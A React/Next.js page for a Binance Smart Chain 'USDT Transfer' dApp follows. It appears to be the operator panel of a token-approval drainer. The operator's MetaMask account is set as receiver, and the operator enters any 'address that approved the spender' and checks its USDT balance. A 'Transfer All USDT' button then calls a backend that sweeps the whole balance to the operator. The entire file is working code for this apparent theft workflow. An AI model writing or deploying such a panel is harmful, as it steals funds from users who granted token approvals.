'use client';

import { useState, useEffect } from 'react';
import { Web3 } from 'web3';
import { BSC_CHAIN_ID, USDT_CONTRACT, USDT_ABI } from './lib/constants';

declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function Home() {
  const [userAddress, setUserAddress] = useState('');
  const [receiverAddress, setReceiverAddress] = useState('');
  const [usdtBalance, setUsdtBalance] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [status, setStatus] = useState('');
  const [web3, setWeb3] = useState<Web3 | null>(null);

  useEffect(() => {
    const init = async () => {
      if (!window.ethereum) {
        setStatus('Please install MetaMask to use this dApp.');
        return;
      }

      const web3Instance = new Web3(window.ethereum);
      setWeb3(web3Instance);

      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: BSC_CHAIN_ID }],
        });

        const accounts = await web3Instance.eth.requestAccounts();
        if (accounts.length > 0) {
          setReceiverAddress(accounts[0]);
        }
      } catch (error: any) {
        if (error.code === 4902) {
          setStatus('Please add the Binance Smart Chain to MetaMask.');
        } else {
          setStatus('Failed to connect to MetaMask.');
        }
      }
    };
    init();

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length > 0) {
        setReceiverAddress(accounts[0]);
      } else {
        setReceiverAddress('');
        setStatus('Please connect your wallet.');
      }
    };

    window.ethereum?.on('accountsChanged', handleAccountsChanged);
    return () => window.ethereum?.removeListener('accountsChanged', handleAccountsChanged);
  }, []);

  const fetchBalance = async () => {
    if (!web3 || !userAddress || !web3.utils.isAddress(userAddress)) {
      setStatus('Please enter a valid user address.');
      return;
    }

    setIsProcessing(true);
    setStatus('Fetching balance...');

    try {
      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
      const balance = await contract.methods.balanceOf(userAddress).call();
      const formattedBalance = web3.utils.fromWei(balance?.toString() || '0', 'ether');
      setUsdtBalance(formattedBalance);
      setStatus('');
    } catch (error) {
      setUsdtBalance(null);
      setStatus('Error fetching USDT balance.');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleTransfer = async () => {
    if (!userAddress || !receiverAddress || usdtBalance === null) {
      setStatus('Invalid state for transfer.');
      return;
    }

    setIsProcessing(true);
    setStatus('Processing transfer...');

    try {
      const balanceInWei = web3?.utils.toWei(usdtBalance, 'ether');
      const response = await fetch('/api/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress,
          receiverAddress,
          amount: balanceInWei,
        }),
      });

      const data = await response.json();
      if (data.success) {
        setStatus(`Transfer successful! TX: ${data.txHash}`);
        setUsdtBalance(null);
        setUserAddress('');
      } else {
        throw new Error(data.error || 'Transfer failed');
      }
    } catch (error: any) {
      setStatus(`Error: ${error.message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <main className="min-h-screen bg-gray-900 text-white p-8">
      <div className="max-w-md mx-auto bg-gray-800 rounded-lg shadow-lg p-8 space-y-6">
        <h1 className="text-3xl font-bold text-center text-blue-400">USDT Transfer</h1>
        
        {!receiverAddress ? (
          <p className="text-center text-yellow-400">{status || 'Connecting to wallet...'}</p>
        ) : (
          <>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-400">Receiver Address</label>
                <div className="mt-1 p-3 bg-gray-700 rounded break-all text-gray-300">
                  {receiverAddress}
                </div>
              </div>

              <div>
                <label htmlFor="user-address" className="block text-sm font-medium text-gray-400">
                  User Address
                </label>
                <input
                  id="user-address"
                  type="text"
                  value={userAddress}
                  onChange={(e) => setUserAddress(e.target.value)}
                  className="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-white"
                  placeholder="Enter address that approved the spender"
                  disabled={isProcessing}
                />
              </div>

              <button
                onClick={fetchBalance}
                disabled={isProcessing || !userAddress}
                className="w-full py-2 px-4 border border-transparent rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50"
              >
                {isProcessing ? 'Checking...' : 'Check Balance'}
              </button>
            </div>

            {usdtBalance !== null && (
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-400">USDT Balance</label>
                  <div className="mt-1 p-3 bg-gray-700 rounded">
                    {usdtBalance} USDT
                  </div>
                </div>

                <button
                  onClick={handleTransfer}
                  disabled={isProcessing}
                  className="w-full py-2 px-4 border border-transparent rounded-md shadow-sm text-white bg-green-600 hover:bg-green-700 disabled:opacity-50"
                >
                  {isProcessing ? 'Processing...' : 'Transfer All USDT'}
                </button>
              </div>
            )}

            {status && (
              <div className="mt-4 p-4 rounded-md bg-gray-700">
                <p className="text-sm break-all">{status}</p>
              </div>
            )}
          </>
        )}
      </div>
    </main>
  );
}
